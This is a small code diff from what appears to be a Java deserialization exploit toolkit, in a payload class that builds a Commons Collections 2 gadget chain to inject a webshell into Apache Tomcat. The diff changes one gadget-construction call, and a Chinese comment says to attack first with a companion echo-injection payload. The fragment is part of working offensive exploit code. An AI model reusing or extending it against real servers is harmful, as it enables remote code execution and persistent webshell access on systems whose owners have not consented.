@@ -29,7 +29,7 @@ public class CommonsCollections2ForTomcatShellInject implements ObjectPayload<Qu
 
 	public Queue<Object> getObject(final String ... command) throws Exception {
 	    //todo 需要先使用 CommonsCollections2ForTomcatEchoInject 打一遍，再用这个打
-		final Object templates = Gadgets.createTemplatesImpl(null, TomcatShellInject.class);
+		final Object templates = Gadgets.createTemplatesImpl(TomcatShellInject.class);
 		// mock method name until armed
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
